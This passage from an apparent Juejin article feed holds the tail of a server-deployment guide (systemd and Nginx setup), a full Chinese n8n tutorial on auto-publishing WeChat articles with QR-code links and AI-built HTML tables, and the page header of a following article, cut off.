sudo <span class="hljs-built_in">cat</span> &gt; /etc/systemd/system/mgir-api.service &lt;&lt; <span class="hljs-string">EOF
[Unit]
Description=MGIR Decision API
After=network.target

[Service]
Type=simple
User=api_user
WorkingDirectory=/opt/mgir-api
ExecStart=/usr/bin/python3 /opt/mgir-api/main.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF</span>

<span class="hljs-comment"># 2. 启动服务</span>
sudo systemctl start mgir-api
sudo systemctl <span class="hljs-built_in">enable</span> mgir-api

<span class="hljs-comment"># 3. 配置反向代理 (Nginx)</span>
sudo <span class="hljs-built_in">cat</span> &gt; /etc/nginx/sites-available/mgir-api &lt;&lt; <span class="hljs-string">EOF
upstream mgir_api {
    server localhost:8000;
}

server {
    listen 80;
    server_name api.mgir.internal;

    location / {
        proxy_pass http://mgir_api;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_buffering off;
    }
}
EOF</span>

sudo <span class="hljs-built_in">ln</span> -s /etc/nginx/sites-available/mgir-api /etc/nginx/sites-enabled/
sudo systemctl reload nginx
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[n8n 实战：工作流自动发布排版精美的公众号文章]]></title>    <link>https://juejin.cn/post/7579473409749696563</link>    <guid>https://juejin.cn/post/7579473409749696563</guid>    <pubDate>2025-12-04T00:29:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579473409749696563" data-draft-id="7579512734296113190" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="n8n 实战：工作流自动发布排版精美的公众号文章"/> <meta itemprop="keywords" content="工作流引擎,人工智能"/> <meta itemprop="datePublished" content="2025-12-04T00:29:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="曹工不加班"/> <meta itemprop="url" content="https://juejin.cn/user/4336129588870957"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            n8n 实战：工作流自动发布排版精美的公众号文章
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4336129588870957/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    曹工不加班
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T00:29:24.000Z" title="Thu Dec 04 2025 00:29:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这一篇紧接着上一期的内容。</p>
<p>上一期我们搞定了科技早报的自动生成，很多同学跑通后跟我反馈：“曹工，图是有了，但发公众号还是很繁琐啊。”</p>
<p>确实，要把图片保存下来，去公众号后台新建图文，手动把新闻一条条复制进去，还得处理外部链接不能跳转的问题，最后还得手动裁剪封面图。这一套下来，没个二十分钟搞不定。</p>
<p>既然要做自动化，就得做得彻底一点。今天我们要实现的效果是：<strong>上一个工作流生成图片后，自动触发这个工作流，完成公众号图文的排版、封面上传、链接转二维码、最后直接生成一篇“待发布”的草稿。</strong></p>
<p>你要做的，只是在手机上预览一下，检查图片是否有缺陷，原文二维码识别跳转是否正常，就可以直接发表了。</p>
<h3 data-id="heading-0">核心难点与解决方案</h3>
<p>在开始连线之前，有两个痛点必须先说清楚，否则后面的配置你可能会看不懂：</p>
<ol>
<li><strong>外链跳转问题</strong>：微信文章内部不支持直接跳外部新闻链接。
<ul>
<li><em>解法</em>：把每一条新闻的链接自动转成二维码图片，放在标题旁边，用户长按识别即可。</li>
</ul>
</li>
<li><strong>封面图裁剪问题</strong>：通过接口上传封面，文章默认的封面裁剪可能是在中间，不能很好的展现封面图。
<ul>
<li><em>解法</em>：这里需要用到一个取巧的方法，手动抓取微信后台的裁剪参数（下文会详细教）。</li>
</ul>
</li>
</ol>
<p>先看一眼最终做出来的草稿效果，左边新闻，右边二维码，底部还自动挂了名片：</p>
<p><img src="https://pic.fmcat.top/picgo/20251202220030975.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-1">准备工作：安装社区节点</h3>
<p>n8n 原生并没有对接微信公众号和生成二维码的功能，我们需要安装两个社区贡献的节点。</p>
<p>点击左侧菜单的 <strong>Settings</strong> -&gt; <strong>Community Nodes</strong> -&gt; <strong>Install</strong>，分别搜索并安装：</p>
<ol>
<li><code>n8n-nodes-wechat</code> (用于操作公众号接口)</li>
<li><code>n8n-nodes-qrcode-generator</code> (用于把链接转成二维码图片)
<img src="https://pic.fmcat.top/picgo/20251202220637860.png" alt="" loading="lazy"/></li>
</ol>
<p>安装完如果没有搜到相关节点可以重启一下 n8n。</p>
<h2 data-id="heading-2">搭建流程</h2>
<p>先看看工作流的全貌</p>
<p><img src="https://pic.fmcat.top/picgo/20251203213331932.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">第一步：接收数据与环境初始化</h3>
<p>这个工作流不是独立运行的，它是被上一个“早报生成”工作流触发的。</p>
<p><strong>Execute Workflow Trigger (工作流被调用)</strong>
这个节点作为入口，接收上游传来的两个核心数据：</p>
<ul>
<li><code>newsList</code>：包含所有新闻标题和链接的数组。</li>
<li><code>picUrl</code>：上一道工序生成好的早报长图链接，封面和内容长图都用这个。</li>
</ul>
<p><img src="https://pic.fmcat.top/picgo/20251202221516464.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">第二步：拆解数据，逐条处理</h3>
<p>因为新闻是“一堆”数据，而生成二维码需要“一条一条”来，所以这里需要把数组拆散。</p>
<p><strong>Split Out (拆分数据)</strong></p>
<ul>
<li><strong>Field to Split Out</strong>: 填入 <code>newsList</code>。
这一步把原本的一条包含 10 个新闻的数据，拆成了 10 条独立的数据流。</li>
</ul>
<p><img src="https://pic.fmcat.top/picgo/20251202222143931.png" alt="" loading="lazy"/></p>
<p>注意节点间连接线上的项目数量，经过这个节点处理，变成了 10 个项目，每个项目都是一条独立的新闻。</p>
<p><strong>Loop Over Items (循环处理)</strong>
这是一个容器节点，所有在它里面的操作，都会对每一条新闻执行一次。</p>
<ul>
<li><strong>Batch Size</strong>: 设为 <code>1</code>，保证顺序处理。</li>
<li>把节点的 Loop 端点连到下一个生成二维码的节点上，每一次循环会传递单条新闻数据。</li>
</ul>
<p><img src="https://pic.fmcat.top/picgo/20251202223808210.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-5">第三步：循环内的核心操作（链接转码）</h3>
<p>接下来的三个节点都在 <code>Loop</code> 循环内部，逻辑非常紧凑：<strong>拿链接 -&gt; 转成码 -&gt; 传给微信 -&gt; 拿到微信图片链接</strong>。</p>
<p><img src="https://pic.fmcat.top/picgo/20251202224257869.png" alt="" loading="lazy"/></p>
<p><strong>QR Code Generator (生成原文链接二维码)</strong>
这是刚才安装的社区节点。</p>
<ul>
<li><strong>Content</strong>: 填当前循环的新闻的 <code>link</code> 字段</li>
<li><strong>Width</strong>: 设置为 <code>300</code> 像素足够了，足够长按识别。
这一步会直接输出一个图片的二进制文件（Binary Data）。</li>
</ul>
<p><img src="https://pic.fmcat.top/picgo/20251202225150051.png" alt="" loading="lazy"/></p>
<p><strong>上传图文消息图片 (WeChat)</strong>
注意，刚刚生成的二维码是在 n8n 的内存里，需要上传为微信图文消息图片，获取到图片链接才可以插入文章里。</p>
<ul>
<li><strong>Binary Property</strong>: 填入 <code>data</code>（这是上一个节点输出图片时的默认属性名）。
执行后，微信会返回一个 <code>url</code>，这个 URL 才是能在公众号文章里显示的图片地址。</li>
</ul>
<p><img src="https://pic.fmcat.top/picgo/20251202225820939.png" alt="" loading="lazy"/></p>
<p>注意所有微信相关操作的节点都要选择凭证，使用<strong>微信开发者平台</strong>（12 月 1 日起所有开发相关的配置都挪到这了）里获取 AppID 和 AppSecret，并且把 n8n 运行机器所在的公网 IP 配置到白名单内。
<img src="https://pic.fmcat.top/picgo/20251202230551237.png" alt="" loading="lazy"/></p>
<p><img src="https://pic.fmcat.top/picgo/20251202231133398.png" alt="" loading="lazy"/></p>
<p><strong>Edit Fields (拼装新闻标题和链接)</strong>
一条新闻跑完所有流程后，我们需要整理一下输出给下一步的数据。
保留两个字段：</p>
<ol>
<li><code>title</code>: 新闻标题。</li>
<li><code>qr_url</code>: 刚才微信返回的那个图片 URL。</li>
</ol>
<p><img src="https://pic.fmcat.top/picgo/20251202231713406.png" alt="" loading="lazy"/></p>
<p>循环执行完成以后，所有新闻的原文链接被替换成了微信提供的二维码访问链接</p>
<p><img src="https://pic.fmcat.top/picgo/20251202232537375.png" alt="" loading="lazy"/></p>
<p>其实 n8n 的设计原则是默认支持循环执行节点的，这块要单独添加循环是因为上传图文消息这个节点不能根据前面传入的项目数量自动运行多次，所有需要手动设计循环流程让每次只处理一个新闻，最后再合并，就没问题了。</p>
<h3 data-id="heading-6">第四步：AI 智能排版</h3>
<p>当所有循环跑完，我们用 <strong>Aggregate</strong> 节点把散落的数据重新聚合起来。现在我们手里有了一个包含所有标题和对应二维码 URL 的列表。</p>
<p>这一步是为了让大模型能拿到完整的新闻列表，如果不合并，后面的 AI Agent 节点会对每个新闻运行一次，这样不符合我们汇总拼接的目的。</p>
<p><img src="https://pic.fmcat.top/picgo/20251203215845296.png" alt="" loading="lazy"/></p>
<p>拿到了新闻标题和原文的二维码链接，怎么把它们变成漂亮的表格？手写 HTML 拼接太累了，这种脏活累活交给 AI 就行了。</p>
<p><strong>AI Agent (排版引擎)</strong></p>
<p>添加 AI Agent 节点，按下图设置，注意 allNews 拖进来以后外面要加上一层 <code>JSON. stringify()</code> m，否则大模型不能准确拿到 JSON 里的内容。</p>
<p><img src="https://pic.fmcat.top/picgo/20251203220536708.png" alt="" loading="lazy"/></p>
<p><strong>Chat Model 端点</strong>连接一个大模型，这里我使用了 Gemini，你用 DeepSeek 也可以。</p>
<p><strong>格式化端点</strong>的选择与填写参考下图</p>
<p><img src="https://pic.fmcat.top/picgo/20251203222117948.png" alt="" loading="lazy"/></p>
<p>我在大模型的系统提示词 Prompt 里写得非常具体，让大模型组装一个标准的 HTML Table。
第一列放新闻标题，第二列放一个 img 标签，src 为这条新闻对应的原文链接生成的二维码，最后拼接为完整的表格结构内容放入 content 字段。</p>
<p>AI 就帮我们把十条新闻瞬间拼成了一段整洁的 HTML 代码，并且从传入的 markdown 内容内提取早报图片的 URL 放入 pic_url 字段。</p>
<p><img src="https://pic.fmcat.top/picgo/20251203220744556.png" alt="20251203220744556.png" loading="lazy"/></p>
<p>早报图片链接原内容为 markdown 格式：</p>
<pre><code class="hljs language-less" lang="less">!<span class="hljs-selector-attr">[image]</span>(<span class="hljs-attribute">https</span>:<span class="hljs-comment">//googlecdn2.datas.systems/storage/response_images/644/2025/12/02/1764691118947519493_6982.png)</span>
</code></pre>
<p>大模型会把 <code>https://googlecdn2.datas.systems/storage/response_images/644/2025/12/02/1764691118947519493_6982.png</code> 部分提取出来，可以复制出来测试一下在浏览器是否能访问。</p>
<h3 data-id="heading-7">第五步：处理封面图（硬核知识点）</h3>
<p>新闻正文搞定了，现在处理封面，因为公众号文章的封面是要使用永久素材的 media_id，所以我们要先把早报的图片上传到微信服务器，获取 media_id 和常规 URL，后续正文内也要用到。</p>
<p><strong>HTTP Request (下载封面)</strong></p>
<p>大模型提取出来的封面链接只是一个 URL，我们需要把它下载成二进制文件。</p>
<ul>
<li><strong>URL</strong>: 填入 <code>picUrl</code>。</li>
<li><strong>Response Format</strong>: 选择 <code>File</code>。</li>
<li/>
</ul>
<p><img src="https://pic.fmcat.top/picgo/20251203222548967.png" alt="" loading="lazy"/></p>
<h4 data-id="heading-8">Edit Image(调整图片大小)</h4>
<p>因为前面的工作流画的早报图片是 4K 高清，图片会比较大，上传微信服务器的时候会报图片太大的错，所以这边添加一个编辑图片的节点，选择 Resize，将图片的尺寸调整到 2K 左右，这样图片的大小就不会超标了。</p>
<p><img src="https://pic.fmcat.top/picgo/20251203223259443.png" alt="" loading="lazy"/></p>
<p><strong>上传永久素材 (WeChat)</strong></p>
<p>把刚才调整完大小的图片传到微信素材库， 这里微信会返回一个 <code>media_id</code>，这是封面的唯一身份证，后面的步骤要用到。</p>
<p><img src="https://pic.fmcat.top/picgo/20251203223730377.png" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">第六步：生成草稿与发布</h3>
<p>终于到了最后一步，把所有东西组装起来。</p>
<p><strong>新增文章 (WeChat)</strong></p>
<ul>
<li><strong>标题</strong>: 可以用表达式自动生成日期，如 <code>{{ $now.format('yyyy年MM月dd日') }} 科技早报</code>。</li>
<li><strong>消息内容</strong>: 插入要展示的早报图片，再把刚才 AI 拼接好的 HTML 字符串也添加到指定的位置。你还可以在前后加上一些固定的头部或尾部（比如“关注曹工不加班”的引导语）。</li>
<li><strong>封面媒体ID</strong>: 填入上一步获取的 <code>media_id</code>。</li>
</ul>
<p><img src="https://pic.fmcat.top/picgo/20251203225257365.png" alt="" loading="lazy"/></p>
<p>下面是消息内容的详细配置</p>
<p><img src="https://pic.fmcat.top/picgo/20251203225444501.png" alt="" loading="lazy"/></p>
<p><strong>关键点：如何达到最好的封面裁切效果？</strong></p>
<p>公众号文章的封面有两个尺寸，具体看下图，合并发布时作为第一个文章时为 <code>2.35:1</code>, 后续文章或者分享出去的卡片封面为 <code>1:1</code>，我们需要获取到封面图裁剪的参数，才能达到最佳展示效果。</p>
<p><img src="https://pic.fmcat.top/picgo/20251203234521192.png" alt="20251203234521192.png" loading="lazy"/></p>
<p>像我的早报顶部有标题和日期，用来做封面图正好，所以这个地方裁剪顶部区域即可，裁剪的参数自己计算有点麻烦，这边有个取巧的方法</p>
<p><strong>获取方法：</strong></p>
<ol>
<li>打开 Chrome 浏览器，登录公众号后台，打开新建文章的编辑器页面。</li>
<li>按 F12 打开开发者工具，切换到 Network 面板。</li>
<li>把工作流生成的图片（尺寸需要固定，至少比例需要固定）添加到封面图并裁剪。</li>
<li>在 Network 里找到上传请求，查看 Payload，复制里面的两组参数用下划线连接。</li>
<li>把这个两个值分别填回 n8n 的对应字段里。</li>
</ol>
<p><img src="https://pic.fmcat.top/picgo/20251203235603629.png" alt="" loading="lazy"/></p>
<p><img src="https://pic.fmcat.top/picgo/20251203235610937.png" alt="" loading="lazy"/></p>
<p><strong>发送钉钉消息</strong></p>
<p>最后，调用 HTTP Request 节点通过钉钉机器人的 Webhook 自己发个通知，告诉自己草稿已经上传完成，审核一下没有问题，就可以发表了。</p>
<p><img src="https://pic.fmcat.top/picgo/20251204000257190.png" alt="" loading="lazy"/></p>
<h2 data-id="heading-10">总结</h2>
<p>这套流程跑通后，以前繁琐的排版工作就变成了全自动，解决了从生成到发布最后一公里的痛点。</p>
<p>这套工作流的 JSON 文件，我都打包好了，关注公众号“<strong>曹工不加班</strong>” 发送 “02” 即可获取，直接拿去导入就能用，有问题可以直接公众号私信我。</p>
<p>感谢同学们能看到最后，曹工不加班，点个关注早点下班～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI Coding与单元测试的协同进化：从验证到驱动]]></title>    <link>https://juejin.cn/post/7579920818870534186</link>    <guid>https://juejin.cn/post/7579920818870534186</guid>    <pubDate>2025-12-05T05:51:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579920818870534186" data-draft-id="7579846221168640054" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI Coding与单元测试的协同进化：从验证到驱动"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-12-05T05:51:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="美团技术团队"/> <meta itemprop="url" content="https://juejin.cn/user/3509296845313741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI Coding与单元测试的协同进化：从验证到驱动
            <!----> <!----></h1> <div class="container team-follow" data-v-d326b38e="" data-v-61fb5e44=""><div class="left" data-v-d326b38e=""><a href="/team/6930512966122995712/posts" data-v-d326b38e=""><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/47ccb42d726640a7889ba1e64ae203e6~tplv-k3u1fbpfcp-watermark.image" class="icon" data-v-d326b38e=""/></a> <div class="content" data-v-d326b38e=""><div style="display: flex" data-v-d326b38e=""><a href="/team/6930512966122995712/posts" data-v-d326b38e=""><p class="title-line" data-v-d326b38e=""><span title="美团技术团队" class="title" data-v-d326b38e="">美团技术团队</span> <img src="//lf-web-assets.juejin.cn/obj/juejin-web/xitu_juejin_web/255e400027b783cbad76dc41527e7695.svg" alt="team icon" class="team-icon" data-v-d326b38e=""/></p></a></div> <div class="meta-box team" data-v-d326b38e="" data-v-61fb5e44=""><time datetime="2025-12-05T05:51:31.000Z" title="Fri Dec 05 2025 05:51:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-d326b38e="" data-v-61fb5e44="">
                2025-12-05
              </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-d326b38e="" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-d326b38e="" data-v-61fb5e44=""/></svg> <span class="views-count" style="display:none;" data-v-d326b38e="" data-v-61fb5e44="">
                0
              </span> <span class="read-time" data-v-d326b38e="" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-d326b38e="" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-d326b38e="" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-d326b38e="" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-d326b38e="" data-v-61fb5e44=""/></svg>
                阅读21分钟
              </span> <!----> <!----></div></div></div> <button class="jj-follow-button follow-btn" style="display:none;" data-v-b60b2868="" data-v-d326b38e=""><span data-v-b60b2868="" data-v-d326b38e=""><i class="byte-icon byte-icon--plus" data-v-d326b38e=""><svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 48 48"><path fill="none" d="M0 0h48v48H0z"/><path d="M24.7 4c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8V22h16.7c.4 0 .6 0 .8.1.2.1.3.2.4.4.1.2.1.3.1.8v1.4c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1H26v16.7c0 .4 0 .6-.1.8-.1.2-.2.3-.4.4-.2.1-.3.1-.8.1h-1.4c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8V26H5.3c-.4 0-.6 0-.8-.1-.2-.1-.3-.2-.4-.4-.1-.2-.1-.3-.1-.8v-1.4c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1H22V5.3c0-.4 0-.6.1-.8.1-.2.2-.3.4-.4.2-.1.3-.1.8-.1h1.4z"/></svg></i>
        关注
      </span></button></div> <div class="team-user block-hidden" data-v-61fb5e44=""><div class="avatar jj-avatar avatar" data-v-03256cc6="" data-v-61fb5e44=""><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8AQMAAAAAMksxAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAA5JREFUKM9jGAWjAAcAAAIcAAE27nY6AAAAAElFTkSuQmCC" alt="avatar" class="lazy avatar-img" data-v-5244ef91="" data-v-03256cc6=""/> </div> <!----> <span class="position ellipsis" data-v-61fb5e44="">
              美团小编 @美团
            </span></div> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 